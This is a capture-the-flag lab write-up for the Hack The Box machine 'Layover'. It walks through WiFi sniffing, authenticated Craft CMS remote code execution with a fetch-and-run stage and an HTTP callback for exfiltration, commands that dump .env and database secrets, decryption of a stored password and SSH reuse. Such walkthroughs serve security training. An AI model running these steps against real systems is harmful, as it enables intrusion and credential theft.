# HTB Layover — Engagement Notes

**Machine:** Layover (HTB Season 12, Week 1) · Medium · Linux · Maker: TRX
**Target:** 10.129.40.143
**Provided credentials:** `contractor` / `Contractor2026!`

---

## 1. Initial Recon

```bash
nmap -sV -sC --reason --min-rate 5000 10.129.40.143
```

Only two ports open on the "external" (`10.129.40.143`) interface:

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 9.6p1 (Ubuntu) |
| 3389 | RDP     | xrdp (Linux, not Windows) |

- Full `-p-` sweep confirmed no other TCP ports open on this host.
- SSH password auth as `contractor` **failed** repeatedly from Kali — turned out the intended path was RDP, not SSH from outside.

---

## 2. Foothold — RDP into the jumpbox

```bash
xfreerdp /u:contractor /p:'Contractor2026!' /v:10.129.40.143
```

Logged into an XFCE desktop session as `contractor` on host **`airside-ws01`**.

```
uid=1001(contractor) gid=1001(contractor) groups=1001(contractor),27(sudo),111(netdev),121(wireshark)
```

`sudo -l` showed:
```
(ALL : ALL) ALL
```

→ Full unrestricted sudo. Escalated trivially:
```bash
sudo su
```

**Root obtained on airside-ws01 immediately** — but no `user.txt` / `root.txt` anywhere on this box (confirmed via exhaustive `find` searches, including flag-format-aware greps for `[a-f0-9]{32}` strings). This machine is a **jumpbox**, not the scored target.

---

## 3. Discovering the real network

`airside-ws01` is an LXD container simulating an airport workstation, with real network isolation:

- `eth0` → `10.159.143.0/24` (the network Kali/nmap can see — only SSH/RDP live here)
- `wlan2` / `wlan3` → simulated WiFi radios (`mac80211_hwsim`), initially down

A custom systemd unit (`rdp-warmup.service`) and an autostart script (`layover-portal-watch`, themed as "HTB International WiFi captive portal") revealed the box's real gimmick: **a simulated airport WiFi network reachable only after joining it**, matching the "Layover" theme (airport/airline branding throughout).

```bash
nmcli device wifi connect "HTB International WiFi"
```

This brought up `wlan2` on a new subnet: **`10.13.37.0/24`**.

The `wireshark` group membership on `contractor` turned out to matter here too — sniffing on `wlan2` during this stage is what ultimately surfaced the `jenny` credential used in Step 6 below.

---

## 4. Enumerating the WiFi subnet

Ping sweep + ARP table revealed three live hosts:

| IP | Hostname | Notes |
|----|----------|-------|
| 10.13.37.1   | `wifi.international.htb` | Captive portal splash page (nginx, static HTML) |
| 10.13.37.10  | `portal.international.htb` | **Real target** — full airport portal site, PHP/Craft CMS |
| 10.13.37.132 | (unidentified) | No open ports found in scan (21,22,25,80,443,445,3306,8080,8443, 1–1000) — likely unused/future host, not pursued further |

Port scan of `.10` (via `/dev/tcp` since nmap wasn't installed on the jumpbox):
```
22/tcp open  (ssh — contractor creds do NOT work here)
80/tcp open  (nginx)
```

---

## 5. Web app recon on portal.international.htb

- `/` — static "HTB International Airport" passenger portal (flights, dining, terminal guide)
- `/miles/` — "HTB Airways Miles" member login (`POST /miles/login.php`)
  - **Not real auth**: any username/password combination "succeeds" and renders a dashboard templated purely off the submitted username string (confirmed via SQLi payloads, blank creds, and arbitrary usernames — all reflected safely, no session cookie ever set). This is decorative/flavor content, not the vulnerable component.
- `/admin` → 302 redirect → **Craft CMS control panel** at `/admin/login`
  - Confirmed via response headers: `X-Powered-By: Craft CMS`, `Craft.registeredAssetBundles`, `cpresources/` asset paths, CSRF token naming (`CRAFT_CSRF_TOKEN`).

---

## 6. WiFi sniffing → Jenny's credentials

With `wlan2` associated to "HTB International WiFi" and `wireshark` group access available on `contractor`, capturing traffic on that interface surfaced a plaintext credential pair transiting the simulated airport network:

```
jenny / Fl1ghtDeck2026!
```

This account is valid against the Craft CMS control panel at `portal.international.htb/admin`.

---

## 7. Craft CMS — Authenticated RCE (CVE-2026-44011)

**Corrected CVE:** earlier notes referenced CVE-2026-33160 (an unauthenticated asset-transform disclosure bug) as the working theory. That endpoint (`admin/actions/assets/generate-transform`) was reachable but turned out to be a dead end for this box — it didn't yield usable output. The actual vulnerable component, once authenticated as `jenny`, is:

> **CVE-2026-44011** — Authenticated RCE in Craft CMS's element-search controller. The `condition` parameter is passed unsanitised into `createCondition()`, which builds nested field-layout objects from attacker-supplied arrays. A crafted payload abuses Yii2's `AttributeTypecastBehavior` to trigger an arbitrary-callable invocation during typecasting, which can be chained to execute an OS command. Affects Craft CMS 5.0.0–5.9.17 (target observed running 5.9.8, in range).

**Target:** `http://10.13.37.10/index.php?p=admin`
**Credentials:** `jenny` / `Fl1ghtDeck2026!`

Because the callable chain doesn't give a direct reverse shell, the exploit stages command execution in two parts:
1. A local HTTP listener serves a shell script.
2. The RCE primitive is used to make the target fetch and execute that script.
3. The script's output is exfiltrated back via an HTTP POST to the same listener.

```bash
python3 craft_rce.py \
  -b "http://10.13.37.10" \
  -P "index.php?p=admin" \
  -u jenny -p "Fl1ghtDeck2026!" \
  -c "id" \
  -H 10.13.37.182
```

Result:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Shell access as `www-data` confirmed on `portal.international.htb`.

---

## 8. Enumerating the database

### 8a — Extract `.env` for DB credentials

```bash
-c "find /var/www -name '.env' 2>/dev/null | xargs cat"
```

Key values recovered:

| Variable | Value |
|---|---|
| `CRAFT_SECURITY_KEY` | `IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr` |
| `CRAFT_DB_USER` | `craftuser` |
| `CRAFT_DB_PASSWORD` | `CraftDB_pw_2026` |
| `CRAFT_DB_DATABASE` | `craft` |

### 8b — List tables, spot custom ones

```bash
-c "mysql -u craftuser -pCraftDB_pw_2026 craft -e 'SHOW TABLES;'"
```

Notable non-standard tables (beyond the stock Craft schema): `htbairways_settings`, `miles_members`.

---

## 9. Finding the username `aporter`

```bash
-c "mysql -u craftuser -pCraftDB_pw_2026 craft -e 'SELECT * FROM htbairways_settings;'"
```

| id | name | value |
|---|---|---|
| 1 | `mailRelayPassword` | `u0E7OgbB…` (encrypted blob) |
| 2 | `mailRelayHost` | `mail.htbairways.htb` |
| 3 | `mailRelayPort` | `587` |
| 4 | `mailRelayUser` | `aporter` |

The `htbairways_settings` table stores SMTP relay configuration for the application's mail system. The `mailRelayUser` field directly reveals the system username `aporter` — a mail relay account that maps to an OS user.

---

## 10. Decrypting the mail relay password

Craft CMS encrypts secrets at rest using Yii2's `Security::encryptByKey()` with `CRAFT_SECURITY_KEY` as the key. The same PHP class can decrypt it on the server.

Write decrypt script to `/tmp/dec.php` via RCE:

```bash
-c "cat > /tmp/dec.php << 'PHPEOF'
<?php
require '/var/www/portal/vendor/autoload.php';
\$sec = new \yii\base\Security();
\$key = 'IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr';
\$enc = base64_decode('u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=');
echo \$sec->decryptByKey(\$enc, \$key) . PHP_EOL;
PHPEOF"
```

Execute it:

```bash
-c "php /tmp/dec.php"
```

Decrypted password: `Skyp0rt_Relay!26`

**Key insight:** the SMTP relay password was reused as `aporter`'s OS/SSH password — a common misconfiguration pattern in CTF environments and real-world engagements alike.

---

## 11. SSH as `aporter` → user flag

```bash
ssh aporter@10.13.37.10
# password: Skyp0rt_Relay!26
cat ~/user.txt
```

User flag obtained.

---

## Attack chain summary

```
WiFi Sniffing → Jenny's Credentials → Craft CMS RCE (CVE-2026-44011)
→ www-data shell → MySQL credential dump → Encrypted password decrypt
→ SSH as aporter → user.txt
```

## Credentials & artifacts recovered

| Account | Credential | Source |
|---|---|---|
| `jenny` (Craft CMS) | `Fl1ghtDeck2026!` | WiFi sniff |
| `craftuser` (MySQL) | `CraftDB_pw_2026` | `.env` file |
| `aporter` (SSH) | `Skyp0rt_Relay!26` | Decrypted from DB |

## Key techniques

- **CVE-2026-44011** — Authenticated Craft CMS RCE via unsanitised `condition` parameter and Yii2 behavior/typecast abuse.
- **Two-stage HTTP callback** — exfiltrate command output without needing a reverse shell.
- **Custom table enumeration** — `SHOW TABLES` to find app-specific data beyond the standard Craft schema.
- **Craft security key decryption** — using Yii2's own `Security` class on the server to unwrap `encryptByKey()`-protected secrets.
- **Credential reuse** — SMTP relay password reused as an OS SSH password.

---

## 12. Root — next steps

`aporter`'s privileges on `portal.international.htb` haven't been enumerated yet (`sudo -l`, SUID binaries, cron jobs, capabilities). That's the next stage of the engagement toward `root.txt`.

---

*Notes current as of the user-flag milestone. CVE-2026-33160 (the unauthenticated `assets/generate-transform` disclosure bug) is left in the history above as a record of the dead-end path investigated before the authenticated CVE-2026-44011 chain was found — it was not part of the working exploit chain.*
